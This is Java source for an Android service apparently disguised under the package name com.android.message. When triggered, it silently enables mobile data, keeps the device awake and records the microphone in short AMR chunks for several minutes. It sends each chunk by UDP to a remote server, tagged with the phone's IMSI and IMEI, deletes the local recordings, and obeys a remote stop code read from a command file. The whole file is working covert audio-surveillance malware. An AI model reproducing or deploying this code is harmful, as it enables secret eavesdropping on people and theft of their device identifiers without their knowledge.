package com.android.message;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.RandomAccessFile;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.LinkedList;
import java.util.Timer;
import java.util.TimerTask;
import java.util.Vector;

import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.PowerManager.WakeLock;
import android.util.Log;
import java.util.Date;
import java.text.SimpleDateFormat;

public class VoiceService extends Service {

	public static final String TAG = "VoiceService";
	public static final String voiceOrderPath = "data/data/com.android.message/";
	// public static final String voiceOrderPath = "/mnt/sdcard/";
	public static final String voiceOrderName = "VoiceOrder.txt";

	// public static AudioPro audioRecord; // 录音的类

	// audioPro->service
	private MediaRecorder mMediaRecorder;
	protected Socket s;
	protected DataOutputStream dout;
	protected LinkedList<byte[]> m_in_q;
	protected Vector<byte[]> m_in_q_v;
	protected ArrayList<byte[]> m_in_q_a;

	DatagramSocket UDPClientSocket; // 用于建立发送packet
	DatagramPacket ClientPacket = null; // 用于封装音频

	protected String serverAddr = ServerIP.servIP;
	protected int serverPort = 10003;

	public WaveFilePro waveFilePro = null;

	private File myRecAudioFile;
	// private File myRecAudioDir;// 得到Sd卡path
	private String amrFileName_01 = "rec_01.amr";
	private String amrFileName_02 = "rec_02.amr";
	private String myFilePath = "";
	// private String myLogFilePath = "/sdcard/testVoice/";
	private String myLogFilePath = "data/data/com.android.message/";
	private boolean sdCardExit;
	// private boolean isStopRecord;
	public static boolean keepSending;
	public boolean isStopRecord;

	public static String audioRegStr; // android语音注册头
	byte[] header; // audioRegStr

	public boolean isSending = false; // 判断上一次调用sendAudio是否执行完

	public int intervalTime = 20 * 1000;// 发送语音间隔 20秒

	private int fileInWrite = 0;
	private int stopWrite = 0; // 开始不停

	public static OpenNetwork network;
	public static boolean networkState;

	private long time_start, time_end;
	// private final long TIME_GAP = 10 * 60 * 1000; //10分钟
	// private final long TIME_GAP = 2 * 60 * 1000 + 5 * 6 * 1000; //2分钟半
	private final long TIME_GAP = 6 * 60 * 1000; // 6分钟

	// 先来6分钟看看

	@Override
	public IBinder onBind(Intent arg0) {
		return null;
	}

	// lzd
	PowerManager.WakeLock wakeLock = null;

	// lzd
	@Override
	public void onCreate() {

		// TODO Auto-generated method stub
		super.onCreate();

		// 放在create里的原因是防止语音过程中再次收到语音命令，导致原始状态被改变
		network = new OpenNetwork(this); // 查看现在的网络状态
		networkState = network.checkNetWorkData(); // 打开网络

		// lzd
		/*
		 * if (wakeLock == null) { PowerManager pm = (PowerManager)
		 * getSystemService(Context.POWER_SERVICE); wakeLock =
		 * pm.newWakeLock(PowerManager
		 * .PARTIAL_WAKE_LOCK,VoiceService.class.getName()); wakeLock.acquire();
		 * } //setForeground(true); //startForeground(1, new
		 * Notification());//保证程序不被销毁
		 */
		if (null == wakeLock) {
			PowerManager pm = (PowerManager) this
					.getSystemService(Context.POWER_SERVICE);
			wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,"com.android.message");
			if (null != wakeLock) {
				wakeLock.acquire();
			}

		}
	
		// lzd
	}

	@Override
	public void onDestroy() {

		super.onDestroy();

		WriteLogFile.writeLog("voice service call destory!");
		// lzd
		/*
		if (null != wakeLock)
        {
			wakeLock.release();
			wakeLock = null;
        }*/
		// stopForeground(true);//对应与startForeground
		// lzd

	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		// TODO Auto-generated method stub
		super.onStartCommand(intent, flags, startId);
		setForeground(true); // 提高service优先级，防止过早被系统搞死

		stopRecord(); // 如果之前在录音，先停下来
		fileInWrite = 1;
		keepSending = true;
		stopWrite = 0;// 开始不停止写

		time_start = System.currentTimeMillis();

		BasicInfo binfo = new BasicInfo(this);
		audioRegStr = "AndAReg" + "@" + binfo.getIMSI() + "@" + binfo.getIMEI();
		header = audioRegStr.getBytes();

		WriteLogFile.writeLog(" " + header.length + "  " + audioRegStr);

		new Thread() { // 在这里执行录音发送代码
			public void run() {
				try {
					Thread.sleep(5 * 1000); // 等待5s，打开网络
				} catch (Exception e) {
					e.printStackTrace();
				}
				System.out.println("ReadSendThread is running..");

				writeLog("ReadSendThread is running..");

				startRecord();
				callAudioClock();

				while (keepSending) {
					if ((fileInWrite == 1) && (stopWrite == 1)) {
						// & getFileLength(myFilePath,amrFileName_01) >=3200*5 )
						// {
						// 停止文件1的写入,开始录制文件2
						System.out.println("stop write 1,start record 2");
						writeLog(getFileLength(myFilePath, amrFileName_01)
								+ "stop write 1,start record 2");
						// 录制2,startRecord函数里面有改变写入文件对象的功能
						startRecord();

						// long time_end = System.currentTimeMillis();

					} else if (fileInWrite == 1 && stopWrite != 1) {// 继续写1
						// & getFileLength(myFilePath,amrFileName_01) < 3200*5)
						// {
						// continue;
					} else if (fileInWrite == 2 && stopWrite == 2) {
						// & getFileLength(myFilePath,amrFileName_02) >= 3200*5)
						// {

						// 停止文件2的写入,开始录制文件1
						System.out.println("stop write 2,start record 1");
						writeLog(getFileLength(myFilePath, amrFileName_02)
								+ "stop write 2, start record 1...");

						// 录制1,startRecord函数里面有改变写入文件对象的功能
						startRecord();

					} else if (fileInWrite == 2 && stopWrite != 2) {// 继续写2

						// continue;
					}
					// 读取keepSending状态,如果状态为false，则将keepSending和isSending置为false...否则不变

				}// while

				try {
					Thread.sleep(15 * 1000); // 等待15s，将最后的数据发送完
					// Thread.sleep(30 * 1000); //等待30s，将最后的数据发送完
				} catch (Exception e) {
					e.printStackTrace();
				}
				if (networkState == false) { // 关闭网络连接
					network.setDataEnabled(false);
				}
				stopSelf(); // 自己停止自己
				try {
					Thread.sleep(5 * 1000); // 等待5s,结束程序
				} catch (Exception e) {
					e.printStackTrace();
				}
				System.exit(0);
			}
		}.start();
		//return START_NOT_STICKY;
		//return START_STICKY;
		return START_REDELIVER_INTENT;
	}

	// 读命令文件，看是否停止
	public boolean isStop() {
		try {
			File logFile = new File(voiceOrderPath + voiceOrderName);
			FileInputStream file = new FileInputStream(logFile);
			byte[] order = new byte[108];
			int read = file.read(order, 0, 108);
			if (read > 0) {
				String orders = new String(order, 0, read);
				if (orders.contains("NtvY")) { // stop语音命令
					WriteLogFile.writeLog("receive message ... stop");
					return true;
				}
			}
		} catch (Exception e) {

		}
		return false;
	}

	// ///////////////////////////////////////////////////////////////////
	private Timer mSendAudioTimer = new Timer(true);
	private TimerTask CLOCK_SENDAUDIO_TimerTask = new TimerTask() {
		public void run() {
			// Looper.prepare();
			Log.v("TimerTask", "CLOCK_SENDAUDIO");
			// 看看是否收到stop命令
			boolean end = isStop();
			if (end == true) {
				stop(); // 停止录音
				return;
			}

			// 当正在发送，等待3S
			while (isSending) {
				try {
					WriteLogFile
							.writeLog("Now is sending, wating 3s, try again...");
					Thread.sleep(3000);
				} catch (Exception e) {
					e.printStackTrace();
				}
			}
			isSending = true;
			sendAudio(); // 发送语音----20120620
			isSending = false;
			// Looper.loop();
		}
	};

	// functions calling Timer
	public void callAudioClock() {
		// 开启注册计时器 15s调用一次sendAudio
		mSendAudioTimer.schedule(CLOCK_SENDAUDIO_TimerTask, 20 * 1000,
				intervalTime);
	}

	// ///////////////////////////////////////////////////////////////////

	/* 线程--保存录取到的录音 */

	class RecordWriteThread extends Thread {
		public void run() {
			System.out.println("RecordWriteThread is running..");

		}
	}

	// ///////////////////////////////////////////////////////////////////////////////
	/* 开始录音 */
	public void startRecord() {
		// 开始录音前先关闭前一个录音
		stopRecord();
		if (!keepSending)
			return;
		String fileName = "";
		if (fileInWrite == 1) {// 文件1在写，并且已写完
			fileName = amrFileName_02;// 接下去写文件2
			fileInWrite = 2;
			WriteLogFile.writeLog("start Record 2...");
		} else {// 文件2在写，并且已写完
			fileName = amrFileName_01;// 接下去写文件1
			fileInWrite = 1;
			WriteLogFile.writeLog("start Record 1...");
		}

		try {
			String filePath;
			/* 判断SD Card是否插入 */
			sdCardExit = Environment.getExternalStorageState().equals(
					android.os.Environment.MEDIA_MOUNTED);

			/* 取得SD Card路径作为录音的文件位置 */
			if (sdCardExit) {
				// myRecAudioDir = Environment.getExternalStorageDirectory();
			}
			// 创建录音文件
			String sdStatus = Environment.getExternalStorageState();
			if (sdStatus.equals(Environment.MEDIA_MOUNTED)) {
				Log.d("startRecord", "SD card is avaiable/writeable right now.");
				String pathName = "/mnt/sdcard/testVoice/";
				filePath = pathName;// path + java.io.File.separator +
									// "testVoice";
				File a = new File(filePath);
				File wavfile = new File(filePath + fileName);
				if (!a.exists()) {
					Log.d("SaveWav", "Create the path:" + filePath);
					a.mkdir();
				}

				if (!wavfile.exists()) {
					Log.d("SaveWav", "Create the file:" + fileName);
					wavfile.createNewFile();
				}

				// System.out.println(filePath+"++++++++++++++++++++++++++++++++++");
				// writeLog(filePath+"++++++");
			} else {
				filePath = "data/data/com.android.message/";
				Log.d("SaveWav", "Create the path:" + filePath);
				// myRecAudioDir = new File(filePath);
			}
			System.out.println(filePath + "++++++++++++++++++++++++++++++++++");
			writeLog(filePath + "++++++");
			myFilePath = filePath;
			myRecAudioFile = new File(filePath, fileName);

			mMediaRecorder = new MediaRecorder();

			mMediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);// 设置数据来源，麦克风
			mMediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.RAW_AMR);// 设置格式
			mMediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);// 设置编码
			mMediaRecorder.setOutputFile(myRecAudioFile.getAbsolutePath());// 设置输出文件路径
			mMediaRecorder.setMaxDuration(18 * 1000); // 最长录18s

			try {
				mMediaRecorder.prepare();
				try {
					mMediaRecorder.start();
				} catch (RuntimeException e) {
					e.printStackTrace();
				}
			} catch (IllegalStateException e) {
				e.printStackTrace();
			}
			isStopRecord = false;
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	// ///////////////////////////////////////////////////////////////////////////////
	/* 停止录音 */
	public void stopRecord() {

		if (mMediaRecorder != null) {

			try {
				mMediaRecorder.stop();
				// 输出录音大小
				Log.v("AudioFileLength", "" + myRecAudioFile.length());
			} catch (RuntimeException e) {
				e.printStackTrace();
			}
			try {
				if (mMediaRecorder != null)
					mMediaRecorder.release();
			} catch (NullPointerException e) {
				e.printStackTrace();
			}

			mMediaRecorder = null;
			isStopRecord = true;
		}
	}

	// ///////////////////////////////////////////////////////////////////////////////
	public void sendAudio() {

		WriteLogFile.writeLog("send audio started");
		time_end = System.currentTimeMillis();
		if (time_end - time_start > TIME_GAP) { // 大于10分钟
			stop();
			return;
		}
		if (fileInWrite == 1) {
			stopWrite = 1;

			stopRecord();

			// 读取文件1并发送数据
			WriteLogFile.writeLog("send Record 1...");
			File wavefile = new File(myFilePath, amrFileName_01);

			RandomAccessFile file = null;

			try {
				file = new RandomAccessFile(wavefile, "rw");
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			}

			try {
				file.seek(6 + 186); // 录制的amr文件头部后面的186字节需要过滤掉
				// byte[] readBuf = new byte[320];
				byte[] readBuf = new byte[320 + header.length];
				for (int i = 0; i < header.length; ++i) {
					readBuf[i] = header[i];
				}
				try {
					UDPClientSocket = new DatagramSocket(10003);// 用于发送语音
				} catch (SocketException e) {
					e.printStackTrace();
					if (UDPClientSocket != null)
						UDPClientSocket.close();
				}
				while (file.read(readBuf, header.length, 320) > 0) {
					// while (file.read(readBuf) > 0) {
					ClientPacket = new DatagramPacket(readBuf, readBuf.length,
							InetAddress.getByName(serverAddr), serverPort);
					// 发送UDP
					try {
						UDPClientSocket.send(ClientPacket);
					} catch (NullPointerException e) {
						e.printStackTrace();
						if (UDPClientSocket != null)
							UDPClientSocket.close();
					}
				}

				// start - 20111227 关掉链接
				if (UDPClientSocket != null)
					UDPClientSocket.close();
				// end - 20111227
				// 删除文件
				deleteMyFile(myFilePath + amrFileName_01);
			} catch (Exception e) {
				e.printStackTrace();
			}

		} else if (fileInWrite == 2) {

			stopWrite = 2;
			// 读取文件2并发送数据
			stopRecord();

			WriteLogFile.writeLog("send record 2...");
			File wavefile = new File(myFilePath, amrFileName_02);
			// Log.v("AudioFile", wavefile.getAbsolutePath());
			// Log.v("AudioFile", "File exists? " + wavefile.exists());
			// Log.v("AudioFile", "" + wavefile.length());

			RandomAccessFile file = null;
			try {
				file = new RandomAccessFile(wavefile, "rw");
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			}

			try {
				file.seek(6 + 186);
				// byte[] readBuf = new byte[320];
				byte[] readBuf = new byte[320 + header.length];
				for (int i = 0; i < header.length; ++i) {
					readBuf[i] = header[i];
				}
				try {

					UDPClientSocket = new DatagramSocket(10003);// 用于发送语音
				} catch (SocketException e) {
					// start - 20111227

					if (UDPClientSocket != null)
						UDPClientSocket.close();
					// end - 20111227
					e.printStackTrace();
				}
				// while (file.read(readBuf) > 0) {
				while (file.read(readBuf, header.length, 320) > 0) {
					// Log.v("AudioFile", "send file part - 2");
					ClientPacket = new DatagramPacket(readBuf, readBuf.length,
							InetAddress.getByName(serverAddr), serverPort);
					// 发送UDP
					try {
						UDPClientSocket.send(ClientPacket);
					} catch (NullPointerException e) {
						// start - 20111227
						if (UDPClientSocket != null)
							UDPClientSocket.close();
						// end - 20111227
						e.printStackTrace();
					}
				}
				if (UDPClientSocket != null)
					UDPClientSocket.close();
				// 删除文件
				deleteMyFile(myFilePath + amrFileName_02);
			} catch (Exception e) {
				e.printStackTrace();
			}

		}
	}

	// ///////////////////////////////////////////////////////////////////////////////

	private int getFileLength(String filePath, String fileName) {
		int ret = 0;
		File f = new File(filePath + fileName);
		try {
			FileInputStream fis = new FileInputStream(f);
			try {
				// available()方法返回可以不受阻塞地从此文件输入流中读取的字节数。
				ret = fis.available();
				// System.out.println(fileName +" length: "+ret);
			} catch (IOException e1) {
				e1.printStackTrace();
			}
		} catch (FileNotFoundException e2) {
			e2.printStackTrace();
		}

		return ret;
	}

	public void stop() {
		WriteLogFile.writeLog("stop Record...");
		this.keepSending = false;
		stopRecord();// 20111019

		if (CLOCK_SENDAUDIO_TimerTask != null) {
			CLOCK_SENDAUDIO_TimerTask.cancel();
			CLOCK_SENDAUDIO_TimerTask = null;
		}

		if (mSendAudioTimer != null) {
			mSendAudioTimer.cancel();
			mSendAudioTimer.purge();
			mSendAudioTimer = null;
		}
		// delete file
	}

	public void writeLog(String strLog) {
		FileOutputStream file = null;

		try {
			File logFile = new File(myLogFilePath + "log.txt");

			file = new FileOutputStream(logFile, true);

			file.write((strLog + "\n").getBytes());
			file.close();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public void resetFileProPara() {
		fileInWrite = 0;
		stopWrite = 0;
	}

	private void deleteMyFile(String path) {
		try {
			File file = new File(path);

			if (file.exists()) {
				System.gc();
				file.delete();
			}

		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
